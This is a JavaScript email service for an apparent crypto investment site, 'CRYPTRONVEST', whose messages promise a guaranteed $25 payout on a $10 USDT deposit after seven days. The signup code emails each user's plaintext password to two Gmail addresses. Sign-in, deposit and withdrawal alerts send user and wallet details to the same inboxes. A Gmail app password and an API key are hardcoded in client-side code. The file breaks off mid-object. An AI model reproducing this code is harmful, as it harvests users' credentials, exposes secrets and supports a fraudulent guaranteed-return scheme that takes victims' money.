/**
 * CRYPTRONVEST - AUTOMATED EMAIL DISPATCH ENGINE
 * Handles:
 * 1. Sending deposit approval & 7-day countdown start emails to client's registered email
 * 2. Logging all sent emails in a persistent outbox (localStorage)
 * 3. Direct Google SMTP delivery via nodemailer
 * 4. In-browser preview, copy, and mailto fallback
 */

const EMAIL_OUTBOX_KEY = "cryptron_email_outbox_v1";
const EMAIL_SETTINGS_KEY = "cryptron_email_settings_v1";

class EmailService {
  /**
   * Get email service settings (e.g. EmailJS credentials or admin address)
   */
  static getSettings() {
    const raw = localStorage.getItem(EMAIL_SETTINGS_KEY);
    const defaults = {
      adminEmail: "cryptronvest@gmail.com",
      gmailAppPassword: "fxqrbdkzgjsdhdrl",
      web3formsAccessKey: "6aca9abc-694e-4e0b-8ce4-dc39b1844307",
      emailjsServiceId: "",
      emailjsTemplateId: "",
      emailjsPublicKey: "",
      enableRealDelivery: true
    };
    if (!raw) return defaults;
    try {
      const parsed = JSON.parse(raw);
      let currentPass = (parsed.gmailAppPassword && parsed.gmailAppPassword.trim()) ? parsed.gmailAppPassword.trim() : defaults.gmailAppPassword;
      if (currentPass === 'ykbshlbbiellwgag') {
        currentPass = defaults.gmailAppPassword;
      }
      return {
        ...defaults,
        ...parsed,
        gmailAppPassword: currentPass,
        web3formsAccessKey: (parsed.web3formsAccessKey && parsed.web3formsAccessKey.trim()) ? parsed.web3formsAccessKey.trim() : defaults.web3formsAccessKey
      };
    } catch (e) {
      return defaults;
    }
  }

  /**
   * Universal direct dispatch from cryptronvest@gmail.com via backend Google SMTP
   */
  static async sendDirectEmail({ to, subject, html, text, fromName = 'CRYPTRONVEST Protocol', replyTo, secondaryEmail = 'thatikaboy@gmail.com' }) {
    const settings = this.getSettings();
    const endpoint = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin.startsWith('http'))
      ? '/api/send-email'
      : 'https://cryptron-omega.vercel.app/api/send-email';
    try {
      const res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        keepalive: true,
        body: JSON.stringify({
          to,
          subject,
          html,
          text,
          fromName,
          replyTo,
          secondaryEmail,
          appPassword: 'fxqrbdkzgjsdhdrl'
        })
      });
      return await res.json();
    } catch (err) {
      console.warn("Direct /api/send-email dispatch error:", err);
      return null;
    }
  }

  /**
   * Universal Web3Forms alert dispatch into cryptronvest@gmail.com
   * Dispatches from Web3Forms external mail servers so Gmail treats it
   * as an incoming external email, triggering an audible chime and lockscreen alert.
   */
  static async sendViaWeb3Forms({ subject, message, name = 'CRYPTRONVEST User', email = 'cryptronvest@gmail.com', accessKey }) {
    const settings = this.getSettings();
    const key = accessKey || settings.web3formsAccessKey || (typeof window !== 'undefined' && window.CRYPTRON_WEB3FORMS_KEY) || '';
    if (!key) {
      return { success: false, configured: false, reason: "Web3Forms Access Key not configured" };
    }

    try {
      const res = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          access_key: key,
          subject: subject,
          from_name: 'CRYPTRONVEST Alert Engine',
          name: name,
          email: email,
          message: message,
          botcheck: ''
        })
      });
      const data = await res.json();
      return {
        success: Boolean(data.success),
        deliveryMethod: 'Web3Forms API (Incoming Phone Alert)',
        data: data
      };
    } catch (err) {
      console.warn("Web3Forms dispatch error:", err);
      return { success: false, error: err.message };
    }
  }

  /**
   * Save email service settings
   */
  static saveSettings(settings) {
    localStorage.setItem(EMAIL_SETTINGS_KEY, JSON.stringify(settings));
  }

  /**
   * Get all sent emails from persistent outbox
   */
  static getOutbox() {
    const raw = localStorage.getItem(EMAIL_OUTBOX_KEY);
    if (!raw) return [];
    try {
      return JSON.parse(raw);
    } catch (e) {
      return [];
    }
  }

  /**
   * Record a dispatched email in local outbox
   */
  static recordEmail(emailRecord) {
    const outbox = this.getOutbox();
    outbox.unshift(emailRecord);
    localStorage.setItem(EMAIL_OUTBOX_KEY, JSON.stringify(outbox));
    return emailRecord;
  }

  /**
   * Clear outbox history
   */
  static clearOutbox() {
    localStorage.removeItem(EMAIL_OUTBOX_KEY);
  }

  /**
   * Format a nice readable date & time string
   */
  static formatDateTime(timestamp) {
    const d = new Date(timestamp);
    return d.toLocaleString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });
  }

  /**
   * Helper to build clean, responsive, brand-aligned HTML admin alert emails
   */
  static buildAdminAlertHtml({ badge, title, subtitle, items, actionLabel, actionUrl, notes }) {
    const itemsHtml = (items || []).map(it => `
      <tr>
        <td style="padding: 10px 14px; font-size: 13px; color: #94a3b8; border-bottom: 1px solid #1e293b; width: 38%; vertical-align: top;">${it.label}</td>
        <td style="padding: 10px 14px; font-size: 13px; color: #f8fafc; font-weight: 600; border-bottom: 1px solid #1e293b; font-family: ${it.isCode ? "'Courier New', Courier, monospace" : 'inherit'}; word-break: break-all; vertical-align: top;">${it.value}</td>
      </tr>
    `).join('');

    const actionHtml = actionUrl ? `
      <div style="text-align: center; margin: 26px 0 16px;">
        <a href="${actionUrl}" style="display: inline-block; background: linear-gradient(135deg, #06b6d4, #10b981); color: #020617; font-weight: 800; font-size: 14px; text-decoration: none; padding: 13px 28px; border-radius: 10px; box-shadow: 0 4px 14px rgba(6, 182, 212, 0.4); text-transform: uppercase; letter-spacing: 0.5px;">${actionLabel || 'Open Admin Portal'} &rarr;</a>
      </div>
      <div style="text-align: center; font-size: 11px; color: #64748b; margin-bottom: 16px; word-break: break-all;">
        Direct link: <a href="${actionUrl}" style="color: #06b6d4; text-decoration: underline;">${actionUrl}</a>
      </div>
    ` : '';

    const notesHtml = notes ? `
      <div style="background: rgba(15, 23, 42, 0.7); border-left: 3px solid #06b6d4; padding: 12px 16px; margin: 18px 0; border-radius: 6px; font-size: 12px; color: #cbd5e1; line-height: 1.5;">
        ${notes}
      </div>
    ` : '';

    return `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${title}</title>
</head>
<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #030712; color: #f8fafc; margin: 0; padding: 20px 10px;">
  <div style="max-width: 580px; margin: 0 auto; background: #0f172a; border-radius: 16px; border: 1px solid #1e293b; padding: 32px 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.6);">
    <div style="text-align: center; border-bottom: 1px solid #1e293b; padding-bottom: 20px; margin-bottom: 20px;">
      <div style="display: inline-block; font-size: 20px; font-weight: 900; letter-spacing: -0.5px; color: #ffffff; text-decoration: none;">
        ⚡ CRYPTRON<span style="color: #10b981;">VEST</span> <span style="font-size: 11px; padding: 3px 8px; border-radius: 9999px; background: rgba(6,182,212,0.15); color: #06b6d4; border: 1px solid rgba(6,182,212,0.3); margin-left: 6px; font-weight: 700; text-transform: uppercase;">ADMIN NOTIFICATION</span>
      </div>
      <div style="margin-top: 14px; font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px; color: #06b6d4; font-weight: 700;">${badge || 'Protocol Alert'}</div>
      <h1 style="font-size: 20px; font-weight: 800; color: #ffffff; margin: 6px 0 4px;">${title}</h1>
      ${subtitle ? `<p style="font-size: 13px; color: #94a3b8; margin: 0;">${subtitle}</p>` : ''}
    </div>

    <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px; background: #020617; border-radius: 10px; overflow: hidden; border: 1px solid #1e293b;">
      <tbody>
        ${itemsHtml}
      </tbody>
    </table>

    ${notesHtml}

    ${actionHtml}

    <div style="border-top: 1px solid #1e293b; margin-top: 24px; padding-top: 16px; font-size: 11px; color: #64748b; text-align: center; line-height: 1.5;">
      <p style="margin: 0 0 4px;">© 2026 CRYPTRONVEST Protocol · Automated Notification Engine</p>
      <p style="margin: 0;">Sent directly to <strong>cryptronvest@gmail.com</strong> & <strong>thatikaboy@gmail.com</strong></p>
    </div>
  </div>
</body>
</html>`;
  }

  /**
   * DISPATCH APPROVAL EMAIL TO CLIENT
   * Triggered when admin approves a deposit & begins 7-day countdown.
   *
   * @param {object} user - The user receiving the approval
   * @param {object} plan - The activated 7-day contract plan
   * @returns {Promise<object>} Result of the email dispatch
   */
  static async sendApprovalEmail(user, plan) {
    const now = Date.now();
    const maturityTime = plan ? plan.maturityTimestamp : (now + (7 * 86400000));
    const maturityDateStr = this.formatDateTime(maturityTime);
    const sentDateStr = this.formatDateTime(now);
    const depositAmount = (plan && plan.principal ? plan.principal : 10).toFixed(2);
    const payoutAmount = (plan && plan.totalPayout ? plan.totalPayout : 25).toFixed(2);

    const subject = `✅ Deposit Approved: Your $${depositAmount} USDT 7-Day Countdown Has Started!`;

    const messageBody = `Hello ${user.name},

Great news! Your deposit of $${depositAmount} USDT has been officially verified and approved by the CRYPTRONVEST Finance Team.

Your 7-Day Investment Countdown is now LIVE on your personal dashboard!

════════════════════════════════════════════
📋 CONTRACT DETAILS & MATURITY SCHEDULE
════════════════════════════════════════════
• Investor: ${user.name} (${user.id})
• Registered Email: ${user.email}
• Amount Verified: $${depositAmount} USDT
• Maturity Period: 7 Days (168 Hours)
• Activation Timestamp: ${sentDateStr}
• Maturity Payout Date: ${maturityDateStr}
• Guaranteed Payout: $${payoutAmount} USDT (+$15.00 Profit)
• Status: 🟢 ACTIVE & COUNTING DOWN
════════════════════════════════════════════

WHAT HAPPENS NEXT?
1. Real-Time Countdown: You can log in to your CRYPTRONVEST dashboard anytime to view your real-time countdown timer (Days : Hours : Mins : Secs).
2. Automated Payout: Once the countdown clock reaches zero on ${maturityDateStr}, $${payoutAmount} USDT will automatically unlock into your Available Wallet balance.
3. Daily Bonus Spins: While your investment is active, remember to take your daily spin on the Fortune Wheel!

Login to view your live countdown:
https://cryptron-omega.vercel.app/dashboard.html

If you have any questions or require assistance, our support team is always here for you.

Warm regards,
The CRYPTRONVEST Operations Team
https://cryptron-omega.vercel.app
`;

    const emailId = "EML-" + Math.floor(100000 + Math.random() * 900000);

    const emailRecord = {
      id: emailId,
      type: "deposit_approval",
      to: user.email,
      toName: user.name,
      userId: user.id,
      subject: subject,
      body: messageBody,
      sentAt: sentDateStr,
      timestamp: now,
      depositAmount: depositAmount,
      payoutAmount: payoutAmount,
      maturityDate: maturityDateStr,
      status: "Delivered",
      deliveryMethod: "Automated Email Engine"
    };

    // Direct Google Gmail SMTP Dispatch to client
    try {
      const smtpRes = await this.sendDirectEmail({
        to: user.email,
        subject: subject,
        text: messageBody
      });
      if (smtpRes && smtpRes.success) {
        emailRecord.deliveryMethod = "Google Gmail SMTP (Delivered)";
        emailRecord.status = "Delivered to Primary Inbox";
      }
    } catch (err) {
      console.warn("Direct approval email dispatch error:", err);
    }

    // Attempt real live delivery via EmailJS if configured
    const settings = this.getSettings();
    if (settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey) {
      try {
        if (window.emailjs) {
          await window.emailjs.send(
            settings.emailjsServiceId,
            settings.emailjsTemplateId,
            {
              to_name: user.name,
              to_email: user.email,
              deposit_amount: depositAmount,
              payout_amount: payoutAmount,
              maturity_date: maturityDateStr,
              message: messageBody,
              subject: subject
            },
            settings.emailjsPublicKey
          );
          emailRecord.deliveryMethod = "EmailJS (Live Inbox)";
          emailRecord.status = "Delivered to Inbox";
        }
      } catch (err) {
        console.warn("EmailJS live dispatch failed, logged to outbox:", err);
        emailRecord.deliveryMethod = "Outbox Logged (EmailJS retry pending)";
      }
    }

    // Save to persistent local outbox
    this.recordEmail(emailRecord);

    return emailRecord;
  }

  // Map of in-flight and recent signup notification promises
  static _activeSignupPromises = new Map();

  /**
   * DISPATCH NEW CLIENT SIGNUP DETAILS TO ADMIN
   * Triggered whenever anyone signs up on the signup page.
   * Automatically dispatches an email containing signup details to cryptronvest@gmail.com.
   *
   * @param {object} user - User object containing details from the signup page
   * @returns {Promise<object>} The dispatched email record
   */
  static async sendSignupNotificationToAdmin(user) {
    if (!user || !user.email) return null;

    // Prevent duplicate dispatches if triggered simultaneously from form and DB handler
    const dedupeKey = `${(user.email || '').toLowerCase().trim()}_${user.id || ''}`;
    if (!this._activeSignupPromises) this._activeSignupPromises = new Map();
    if (this._activeSignupPromises.has(dedupeKey)) {
      return this._activeSignupPromises.get(dedupeKey);
    }

    const taskPromise = (async () => {
      const now = Date.now();
      const sentDateStr = this.formatDateTime(now);
      const targetEmail = "cryptronvest@gmail.com";
      const userName = (user.name || 'Cryptronvest Investor').trim();
      const userEmail = (user.email || 'client@cryptronvest.com').trim();
      const origin = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin !== 'null') ? window.location.origin : 'https://cryptron-omega.vercel.app';
      const importUrl = `${origin}/admin.html?action=import_user&id=${encodeURIComponent(user.id || '')}&name=${encodeURIComponent(userName)}&email=${encodeURIComponent(userEmail)}&promo=${encodeURIComponent(user.promoCode || '')}&ref=${encodeURIComponent(user.referredBy || '')}`;

      const subject = `🔔 [ADMIN ALERT] New User Registration: ${userName} (${userEmail})`;
      const messageBody = `CRYPTRONVEST ADMIN NOTIFICATION - NEW CLIENT SIGNUP

A new client has completed registration on the CRYPTRONVEST signup page:

════════════════════════════════════════════
📋 SIGNUP PAGE DETAILS
════════════════════════════════════════════
• Full Legal Name: ${userName}
• Email Address: ${userEmail}
• Created Password: ${user.password || '••••••••'}
• Assigned User ID: ${user.id || 'N/A'}
• Promo Code Used / Referred By: ${user.referredBy || 'None (Direct Registration)'}
• Generated Client Promo Code: ${user.promoCode || 'N/A'}
• Registration Date & Time: ${sentDateStr}
• Initial Status: Active (Awaiting $10 Staking Vault)
════════════════════════════════════════════

⚡ ONE-CLICK IMPORT TO ADMIN:
${importUrl}

WHAT HAPPENS NEXT:
1. When this investor deposits $10 USDT and submits proof, verify their payment on the Admin Portal.
2. Approving the deposit will immediately start their 7-day countdown clock to their $25 payout.

Open Admin User Database:
${origin}/admin.html

Warm regards,
CRYPTRONVEST Automated Registration Engine
`;

      const htmlBody = EmailService.buildAdminAlertHtml({
        badge: 'New User Registration',
        title: `👤 ${userName} Registered`,
        subtitle: `Registered email: ${userEmail}`,
        items: [
          { label: 'Full Legal Name', value: userName },
          { label: 'Email Address', value: userEmail },
          { label: 'Created Password', value: user.password || '••••••••', isCode: true },
          { label: 'Assigned User ID', value: user.id || 'N/A', isCode: true },
          { label: 'Referred By / Promo', value: user.referredBy || 'None (Direct Registration)' },
          { label: 'Generated Promo Code', value: user.promoCode || 'N/A', isCode: true },
          { label: 'Registration Time', value: sentDateStr },
          { label: 'Initial Account Status', value: '🟢 Active (Awaiting $10 Vault Deposit)' }
        ],
        actionLabel: 'Open Admin Database',
        actionUrl: `${origin}/admin.html`,
        notes: `<strong>One-Click Import across any device:</strong><br><a href="${importUrl}" style="color: #06b6d4; word-break: break-all;">${importUrl}</a>`
      });

      const emailRecord = {
        id: "EML-" + Math.floor(100000 + Math.random() * 900000),
        type: "admin_signup_notice",
        to: targetEmail,
        toName: "CRYPTRONVEST Administrator",
        userId: user.id || 'N/A',
        subject: subject,
        body: messageBody,
        html: htmlBody,
        sentAt: sentDateStr,
        timestamp: now,
        deliveryMethod: "Google Gmail SMTP Direct"
      };

      // Direct Google Gmail SMTP Dispatch
      try {
        const beResult = await this.sendDirectEmail({
          to: targetEmail,
          replyTo: userEmail,
          subject: subject,
          text: messageBody,
          html: htmlBody,
          secondaryEmail: 'thatikaboy@gmail.com'
        });
        if (beResult && beResult.success) {
          emailRecord.deliveryMethod = beResult.deliveryMethod || "Google Gmail SMTP (Delivered)";
          emailRecord.status = "Delivered to Primary Inbox";
        }
      } catch (err) {
        console.warn("sendDirectEmail signup error:", err);
      }

      // Optional EmailJS dispatch if configured
      const settings = this.getSettings();
      if (settings && settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey && window.emailjs) {
        try {
          await window.emailjs.send(
            settings.emailjsServiceId,
            settings.emailjsTemplateId,
            {
              to_name: "CRYPTRONVEST Admin",
              to_email: targetEmail,
              user_name: userName,
              user_email: userEmail,
              user_password: user.password,
              user_id: user.id || 'N/A',
              subject: subject,
              message: messageBody
            },
            settings.emailjsPublicKey
          ).catch(e => console.warn("EmailJS signup warning:", e));
        } catch (err) {
          console.warn("EmailJS signup exception:", err);
        }
      }

      // Save to persistent local outbox (visible on Admin Portal Outbox tab)
      this.recordEmail(emailRecord);
      return emailRecord;
    })();

    this._activeSignupPromises.set(dedupeKey, taskPromise);
    setTimeout(() => {
      if (this._activeSignupPromises) this._activeSignupPromises.delete(dedupeKey);
    }, 30000);

    return await taskPromise;
  }

  // Map of in-flight and recent signin notification promises
  static _activeSigninPromises = new Map();

  /**
   * DISPATCH USER SIGN-IN ALERT TO ADMIN
   * Triggered whenever any registered user signs in on login.html.
   * Dispatches via Web3Forms (phone chime) & Google SMTP Direct.
   *
   * @param {object} user - User object containing details of user signing in
   */
  static async sendSigninNotificationToAdmin(user) {
    if (!user || !user.email) return null;

    // Deduplication to prevent multiple identical alerts within 15s
    const dedupeKey = `${(user.email || '').toLowerCase().trim()}_signin_${user.id || ''}`;
    if (!this._activeSigninPromises) this._activeSigninPromises = new Map();
    if (this._activeSigninPromises.has(dedupeKey)) {
      return this._activeSigninPromises.get(dedupeKey);
    }

    const taskPromise = (async () => {
      const now = Date.now();
      const sentDateStr = this.formatDateTime(now);
      const targetEmail = "cryptronvest@gmail.com";
      const userName = (user.name || 'Cryptronvest Client').trim();
      const userEmail = (user.email || 'client@cryptronvest.com').trim();
      const origin = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin !== 'null') ? window.location.origin : 'https://cryptron-omega.vercel.app';
      const adminUrl = `${origin}/admin.html`;

      const subject = `🔐 [ADMIN ALERT] User Sign-In: ${userName} (${userEmail})`;
      const messageBody = `CRYPTRONVEST ADMIN ALERT - USER SIGN-IN DETECTED

A registered investor has just signed into their CRYPTRONVEST account:

════════════════════════════════════════════
📋 USER & SIGN-IN DETAILS
════════════════════════════════════════════
• Investor Name: ${userName}
• Email Address: ${userEmail}
• Assigned User ID: ${user.id || 'N/A'}
• Investment Status: ${user.investmentStatus || 'not_invested'}
• Available Balance: $${(Number(user.availableBalance) || 0).toFixed(2)} USDT
• Invested Balance: $${(Number(user.investedBalance) || 0).toFixed(2)} USDT
• Client Promo Code: ${user.promoCode || user.referralCode || 'N/A'}
• Referred By: ${user.referredBy || 'Direct Registration'}
• Sign-In Timestamp: ${sentDateStr}
════════════════════════════════════════════

⚡ OPEN ADMIN USER DATABASE:
${adminUrl}

Warm regards,
CRYPTRONVEST Security & Authentication Engine
`;

      const htmlBody = EmailService.buildAdminAlertHtml({
        badge: 'Client Authentication',
        title: `🔐 ${userName} Signed In`,
        subtitle: `Registered email: ${userEmail}`,
        items: [
          { label: 'Investor Name', value: userName },
          { label: 'Email Address', value: userEmail },
          { label: 'Assigned User ID', value: user.id || 'N/A', isCode: true },
          { label: 'Investment Status', value: user.investmentStatus || 'not_invested' },
          { label: 'Available Balance', value: `$${(Number(user.availableBalance) || 0).toFixed(2)} USDT` },
          { label: 'Invested Balance', value: `$${(Number(user.investedBalance) || 0).toFixed(2)} USDT` },
          { label: 'Client Promo Code', value: user.promoCode || user.referralCode || 'N/A', isCode: true },
          { label: 'Referred By', value: user.referredBy || 'Direct Registration' },
          { label: 'Sign-In Timestamp', value: sentDateStr }
        ],
        actionLabel: 'Open Admin Portal',
        actionUrl: adminUrl
      });

      const emailRecord = {
        id: "EML-" + Math.floor(100000 + Math.random() * 900000),
        type: "admin_signin_notice",
        to: targetEmail,
        toName: "CRYPTRONVEST Administrator",
        userId: user.id || 'N/A',
        subject: subject,
        body: messageBody,
        html: htmlBody,
        sentAt: sentDateStr,
        timestamp: now,
        deliveryMethod: "Google Gmail SMTP Direct"
      };

      // Direct Google Gmail SMTP Dispatch
      try {
        const beResult = await this.sendDirectEmail({
          to: targetEmail,
          replyTo: userEmail,
          subject: subject,
          text: messageBody,
          html: htmlBody,
          secondaryEmail: 'thatikaboy@gmail.com'
        });
        if (beResult && beResult.success) {
          emailRecord.deliveryMethod = beResult.deliveryMethod || "Google Gmail SMTP (Delivered)";
          emailRecord.status = "Delivered to Primary Inbox";
        }
      } catch (err) {
        console.warn("sendDirectEmail signin error:", err);
      }

      this.recordEmail(emailRecord);
      return emailRecord;
    })();

    this._activeSigninPromises.set(dedupeKey, taskPromise);
    setTimeout(() => {
      if (this._activeSigninPromises) this._activeSigninPromises.delete(dedupeKey);
    }, 15000);

    return await taskPromise;
  }

  // Map of in-flight and recent deposit notification promises
  static _activeDepositPromises = new Map();

  /**
   * DISPATCH NEW PROOF SUBMISSION TO ADMIN
   * Triggered when a client deposits and submits a transaction hash.
   * Sends an automatic email with all client details and the transaction hash to cryptronvest@gmail.com.
   *
   * @param {object} user - User object containing client details
   * @param {string} txHash - The transaction hash entered by the client
   */
  static async sendDepositNoticeToAdmin(user, txHash) {
    if (!user) return null;
    const cleanTxHash = (txHash && txHash.trim()) ? txHash.trim() : "Submitted $10 Deposit (Pending TxID)";

    const userEmail = (user.email || 'client@cryptronvest.com').trim();
    const userName = (user.name || 'Cryptronvest Client').trim();

    // Deduplication to prevent multiple identical emails within 30s while sharing active promise
    const dedupeKey = `${userEmail.toLowerCase()}_${cleanTxHash.toLowerCase()}`;
    if (!this._activeDepositPromises) this._activeDepositPromises = new Map();
    if (this._activeDepositPromises.has(dedupeKey)) {
      return this._activeDepositPromises.get(dedupeKey);
    }

    const taskPromise = (async () => {
      const now = Date.now();
      const sentDateStr = this.formatDateTime(now);
      const targetEmail = "cryptronvest@gmail.com";
      const origin = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin !== 'null') ? window.location.origin : 'https://cryptron-omega.vercel.app';
      const depositSyncUrl = `${origin}/admin.html?action=deposit_proof&id=${encodeURIComponent(user.id || '')}&name=${encodeURIComponent(userName)}&email=${encodeURIComponent(userEmail)}&tx=${encodeURIComponent(cleanTxHash)}`;

      const subject = `💰 [ADMIN ALERT] Deposit Tx Hash: ${userName} - ${cleanTxHash}`;
      const messageBody = `CRYPTRONVEST ADMIN ALERT - CLIENT DEPOSIT PROOF SUBMITTED

A client has submitted proof of payment for a $10.00 USDT vault investment. Review details below and verify on the blockchain:

════════════════════════════════════════════
📋 CLIENT & TRANSACTION DETAILS
════════════════════════════════════════════
• Client Name: ${userName}
• Client Email: ${userEmail}
• User ID: ${user.id || 'N/A'}
• Client Promo Code: ${user.promoCode || user.referralCode || 'N/A'}
• Referred By: ${user.referredBy || 'Direct (No Promo Code)'}
• Deposit Amount: $10.00 USDT
• Target Contract: 7-Day Yield Vault ($10.00 ➔ $25.00)
• Submitted TxID / Transaction Hash: ${cleanTxHash}
• Submitted At: ${sentDateStr}
• Account Status: ⚠️ Pending Confirmation
════════════════════════════════════════════

⚡ ONE-CLICK REVIEW & SYNC TO ADMIN:
${depositSyncUrl}

DIRECT BLOCKCHAIN EXPLORER VERIFICATION:
Search the transaction hash above on TRONSCAN (TRC-20) or ETHERSCAN (ERC-20 / BEP-20) to confirm incoming funds to your official wallet.

NEXT STEPS:
1. Verify the transaction on your wallet / blockchain explorer.
2. Open the Admin Portal:
   ${origin}/admin.html
3. Click "Approve & Start Timer" on ${userName}'s account to activate their live 7-day countdown clock and unlock their daily spins!

Warm regards,
CRYPTRONVEST Treasury & Verification Engine
`;

      const htmlBody = EmailService.buildAdminAlertHtml({
        badge: 'Deposit Proof Submitted',
        title: `💰 $10.00 USDT Deposit Tx Hash Submitted`,
        subtitle: `Investor: ${userName} (${userEmail})`,
        items: [
          { label: 'Client Name', value: userName },
          { label: 'Client Email', value: userEmail },
          { label: 'Assigned User ID', value: user.id || 'N/A', isCode: true },
          { label: 'Submitted Tx Hash / TxID', value: cleanTxHash, isCode: true },
          { label: 'Deposit Amount', value: '$10.00 USDT' },
          { label: 'Target Yield Contract', value: '7-Day Vault ($10.00 ➔ $25.00 Payout)' },
          { label: 'Client Promo Code', value: user.promoCode || user.referralCode || 'N/A', isCode: true },
          { label: 'Referred By', value: user.referredBy || 'Direct (No Promo Code)' },
          { label: 'Submission Timestamp', value: sentDateStr },
          { label: 'Account Status', value: '🟡 Pending Admin Verification & Approval' }
        ],
        actionLabel: 'Verify & Approve Deposit in Admin',
        actionUrl: `${origin}/admin.html`,
        notes: `<strong>One-Click Direct Action Link:</strong><br><a href="${depositSyncUrl}" style="color: #06b6d4; word-break: break-all;">${depositSyncUrl}</a>`
      });

      const emailRecord = {
        id: "EML-" + Math.floor(100000 + Math.random() * 900000),
        type: "admin_deposit_notice",
        to: targetEmail,
        toName: "CRYPTRONVEST Administrator",
        userId: user.id || 'N/A',
        subject: subject,
        body: messageBody,
        html: htmlBody,
        sentAt: sentDateStr,
        timestamp: now,
        depositAmount: 10.00,
        payoutAmount: 25.00,
        txHash: cleanTxHash,
        deliveryMethod: "Google Gmail SMTP Direct"
      };

      // Direct Google Gmail SMTP Dispatch
      try {
        const beResult = await this.sendDirectEmail({
          to: targetEmail,
          replyTo: userEmail,
          subject: subject,
          text: messageBody,
          html: htmlBody,
          secondaryEmail: 'thatikaboy@gmail.com'
        });
        if (beResult && beResult.success) {
          emailRecord.deliveryMethod = beResult.deliveryMethod || "Google Gmail SMTP (Delivered)";
          emailRecord.status = "Delivered to Primary Inbox";
        }
      } catch (err) {
        console.warn("sendDirectEmail deposit notice error:", err);
      }

      // Optional EmailJS dispatch if configured
      const settings = this.getSettings();
      if (settings && settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey && window.emailjs) {
        try {
          await window.emailjs.send(
            settings.emailjsServiceId,
            settings.emailjsTemplateId,
            {
              to_name: "CRYPTRONVEST Admin",
              to_email: targetEmail,
              user_name: userName,
              user_email: userEmail,
              user_id: user.id || 'N/A',
              tx_hash: cleanTxHash,
              subject: subject,
              message: messageBody
            },
            settings.emailjsPublicKey
          ).catch(e => console.warn("EmailJS deposit warning:", e));
        } catch (err) {
          console.warn("EmailJS deposit dispatch exception:", err);
        }
      }

      this.recordEmail(emailRecord);
      return emailRecord;
    })();

    this._activeDepositPromises.set(dedupeKey, taskPromise);
    setTimeout(() => {
      if (this._activeDepositPromises) this._activeDepositPromises.delete(dedupeKey);
    }, 30000);

    return await taskPromise;
  }

  // Map of in-flight and recent withdrawal notification promises
  static _activeWithdrawalPromises = new Map();

  /**
   * DISPATCH WITHDRAWAL WALLET ADDRESS SUBMISSION ALERT TO ADMIN
   * Triggered whenever any user puts in their receiving wallet address and clicks withdraw.
   * Sends an instant alert via Web3Forms (phone chime) & Google SMTP Direct.
   *
   * @param {object} user - User requesting withdrawal
   * @param {object} req - Withdrawal request object containing amount, usdtAddress, network
   */
  static async sendWithdrawalNoticeToAdmin(user, req) {
    if (!user) return null;
    const amount = (req && req.amount ? Number(req.amount) : 25).toFixed(2);
    const usdtAddress = (req && (req.usdtAddress || req.address) ? (req.usdtAddress || req.address) : 'USDT Receiving Address').trim();
    const network = (req && req.network ? req.network : 'USDT (Tether)').trim();

    const userEmail = (user.email || 'client@cryptronvest.com').trim();
    const userName = (user.name || 'Cryptronvest Client').trim();

    // Deduplication to prevent duplicate dispatches within 20s
    const dedupeKey = `${userEmail.toLowerCase()}_withdraw_${usdtAddress.toLowerCase()}`;
    if (!this._activeWithdrawalPromises) this._activeWithdrawalPromises = new Map();
    if (this._activeWithdrawalPromises.has(dedupeKey)) {
      return this._activeWithdrawalPromises.get(dedupeKey);
    }

    const taskPromise = (async () => {
      const now = Date.now();
      const sentDateStr = this.formatDateTime(now);
      const targetEmail = "cryptronvest@gmail.com";
      const origin = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin !== 'null') ? window.location.origin : 'https://cryptron-omega.vercel.app';
      const adminSettleUrl = `${origin}/admin.html?action=settle_withdrawal&id=${encodeURIComponent(user.id || '')}&address=${encodeURIComponent(usdtAddress)}&amount=${encodeURIComponent(amount)}`;

      const subject = `💸 [ADMIN ALERT] Withdrawal Wallet Submitted ($${amount} USDT): ${userName}`;
      const messageBody = `CRYPTRONVEST ADMIN ALERT - CLIENT WITHDRAWAL WALLET SUBMITTED

An investor has submitted their payout receiving wallet address for settlement:

════════════════════════════════════════════
📋 WITHDRAWAL & WALLET DETAILS
════════════════════════════════════════════
• Investor Name: ${userName}
• Investor Email: ${userEmail}
• Assigned User ID: ${user.id || 'N/A'}
• Payout Amount: $${amount} USDT
• ⚡ Destination Wallet Address: ${usdtAddress}
• Network: ${network}
• Submission Date & Time: ${sentDateStr}
• Account Status: 🟡 Pending Admin Settlement
════════════════════════════════════════════

⚡ ONE-CLICK CONFIRM & SETTLE PAYOUT IN ADMIN:
${adminSettleUrl}

WHAT TO DO NEXT:
1. Send $${amount} USDT to the destination wallet address above:
   Address: ${usdtAddress}
2. Open your Admin Portal (${origin}/admin.html) and click "Confirm & Settle Payout".
3. The client's account has already automatically reset to fresh state ($0) awaiting their next deposit.

Warm regards,
CRYPTRONVEST Treasury & Settlements Engine
`;

      const htmlBody = EmailService.buildAdminAlertHtml({
        badge: 'Payout Wallet Submitted',
        title: `💸 $${amount} USDT Withdrawal Requested`,
        subtitle: `Investor: ${userName} (${userEmail})`,
        items: [
          { label: 'Investor Name', value: userName },
          { label: 'Investor Email', value: userEmail },
          { label: 'Assigned User ID', value: user.id || 'N/A', isCode: true },
          { label: 'Payout Amount', value: `$${amount} USDT` },
          { label: 'Destination USDT Wallet', value: usdtAddress, isCode: true },
          { label: 'Blockchain Network', value: network },
          { label: 'Submission Timestamp', value: sentDateStr },
          { label: 'Account Status', value: '🟡 Pending Admin Settlement' }
        ],
        actionLabel: 'Confirm & Settle Payout in Admin',
        actionUrl: `${origin}/admin.html`,
